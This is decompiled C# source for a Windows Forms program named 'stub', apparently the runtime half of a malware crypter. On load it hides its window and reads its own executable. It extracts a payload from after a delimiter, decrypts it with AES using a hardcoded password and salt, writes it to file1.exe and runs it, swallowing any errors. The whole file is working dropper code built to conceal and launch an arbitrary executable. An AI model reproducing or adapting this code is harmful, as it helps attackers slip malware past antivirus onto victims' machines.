using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace stub;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer ojwoerkAp;

	private string string_0;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && ojwoerkAp != null)
			{
				ojwoerkAp.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Control)this).set_Visible(false);
			((Control)this).Hide();
			string text = "8bda087801ee923b02ff7a5447b6c9b8416da33aed3536bc3aad1bf463442db5";
			string password = "3p699792sq691s854374n76841899n6p867nqr2r4247707436n4776oo38083sn";
			FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
			string_0 = Strings.Space(checked((int)FileSystem.LOF(1)));
			FileSystem.FileGet(1, ref string_0, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string[] array = Strings.Split(string_0, text, -1, (CompareMethod)0);
			string text2 = array[1];
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
			try
			{
				byte[] array2 = Convert.FromBase64String(text2);
				cryptoStream.Write(array2, 0, array2.Length);
				cryptoStream.Close();
				text2 = Encoding.UTF8.GetString(memoryStream.ToArray());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			FileSystem.FileOpen(1, "file1.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
			FileSystem.FilePut(1, text2, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			Interaction.Shell("file1.exe", (AppWinStyle)1, false, -1);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		((Form)this).Close();
	}
}
